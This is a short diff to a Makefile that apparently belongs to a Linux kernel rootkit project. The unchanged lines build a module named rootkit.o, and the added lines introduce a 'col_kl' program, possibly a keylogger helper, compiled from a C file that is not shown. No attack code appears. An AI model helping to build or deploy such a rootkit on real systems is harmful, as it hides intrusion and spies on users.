@@ -1,3 +1,6 @@
+col_kl : col_kl.c
+		cc -o col_kl col_kl.c
+
 ifneq ($(KERNELRELEASE),)
 	obj-m := rootkit.o
 else
